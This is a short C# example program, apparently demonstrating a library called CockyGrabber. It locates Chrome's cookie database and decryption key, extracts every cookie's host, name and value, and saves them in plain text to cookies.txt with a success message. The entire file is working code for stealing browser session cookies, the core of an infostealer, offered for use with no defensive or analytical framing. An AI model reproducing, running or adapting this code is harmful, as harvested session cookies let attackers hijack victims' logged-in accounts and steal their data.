using CockyGrabber;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace GrabberExamples
{
    class Program
    {
        static void Main(string[] args)
        {
            StringBuilder chromeCookies = new StringBuilder();

            ChromeGrabber cg = new ChromeGrabber();
            if (cg.CookiesExists() && cg.KeyExists())
            {
                foreach (var item in cg.GetAllCookies(cg.GetKey()))
                {
                    chromeCookies.AppendLine(item.HostName + " = " + item.Name + ":" + item.Value);
                }
            }

            File.WriteAllText("cookies.txt", chromeCookies.ToString());
            Console.WriteLine("Cookies Grabbed and saved Successfully!");
            Console.ReadKey();
        }
    }
}
